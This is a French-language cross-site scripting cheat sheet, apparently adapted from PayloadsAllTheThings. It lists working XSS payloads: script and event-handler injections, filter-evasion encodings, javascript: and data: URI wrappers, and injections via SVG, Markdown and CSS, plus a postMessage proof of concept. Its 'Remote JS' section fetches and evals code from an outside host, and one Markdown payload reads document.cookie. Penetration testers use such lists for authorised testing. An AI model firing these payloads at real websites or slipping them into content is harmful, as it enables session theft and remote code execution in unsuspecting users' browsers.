# XSS Injection

> [PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/)

Utiliser `alert(document.domain)` plutôt que `alert(1)` pour confirmer le scope d'exécution.\
Pour du stored XSS, préférer `console.log()` pour éviter de fermer le popup à chaque fois.

```html
<script>alert(document.domain.concat("\n").concat(window.origin))</script>
```

# Payloads HTML

```javascript
// Basic
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<script>alert('22')</script>
<script>eval('\x61lert(\'33\')')</script>
<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">

// Img
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
"><img src=x onerror=alert('XSS');>
<img src=x:alert(alt) onerror=eval(src) alt=xss>

// SVG
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
"><svg/onload=alert(/XSS/)
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>

// Div
<div onpointerover="alert(45)">MOVE HERE</div>
<div onpointerdown="alert(45)">MOVE HERE</div>
```

### HTML5 tags

```javascript
<body onload=alert(/XSS/.source)>
<input autofocus onfocus=alert(1)>
<video/poster/onerror=alert(1)>
<video><source onerror="javascript:alert(1)">
<details/open/ontoggle="alert`1`">
<audio src onloadstart=alert(1)>
<marquee onstart=alert(1)>
```

### Remote JS

```html
<svg/onload='fetch("//host/a").then(r=>r.text().then(t=>eval(t)))'>
<script src=14.rs>
```

### Hidden input

```javascript
// CTRL+SHIFT+X pour déclencher
<input type="hidden" accesskey="X" onclick="alert(1)">

// firefox-130 / chrome-108
<input type="hidden" oncontentvisibilityautostatechange="alert(1)" style="content-visibility:auto">
```

### Uppercase output

```javascript
<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
```

### DOM Based

```javascript
#"><img src=/ onerror=alert(2)>
```

### JS Context

```javascript
-(confirm)(document.domain)//
; alert(1);//
```

# Wrappers URI

```javascript
// javascript:
javascript:prompt(1)
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
javascript:alert(1)
java%0ascript:alert(1)
javascript://%0Aalert(1)

// data:
data:text/html,<script>alert(0)</script>
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

# XSS dans des fichiers

### XML / SVG

```xml
<name><value><![CDATA[<script>confirm(document.domain)</script>]]></value></name>
```

### Markdown

```
[a](javascript:prompt(document.cookie))
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](javascript:window.onerror=alert;throw%201)
```

### CSS

```html
<style>
div { background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>"); }
</style>
```

# PostMessage

> Si `targetOrigin` est `*`, le message peut être envoyé à n'importe quel domaine.

```html
<script>
document.getElementById('btn').onclick = function(e){
    window.poc = window.open('http://www.redacted.com/#login');
    setTimeout(function(){
        window.poc.postMessage(
            { "sender": "accounts", "url": "javascript:confirm('XSS')" },
            '*'
        );
    }, 2000);
}
</script>
```
